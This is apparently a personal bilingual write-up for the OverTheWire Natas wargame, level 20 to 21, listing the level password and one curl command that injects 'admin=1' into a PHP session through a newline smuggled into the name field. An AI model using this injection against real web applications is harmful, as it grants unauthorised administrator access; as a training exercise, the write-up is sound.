# Natas Nivel 20 → 21

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 20 → 21 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas20.natas.labs.overthewire.org` |

# Username
natas20
# Password
p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
# Web vulnerability
Session fixation, session injection
# Method of solve
We need to inject a new value into the session file.
```
curl -X POST -u 'natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw' -v 'http://natas20.natas.labs.overthewire.org/?debug=1' -b 'PHPSESSID=413e96uk941o14rn1jb52ak29m' -d 'name=test%0Aadmin=1'
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
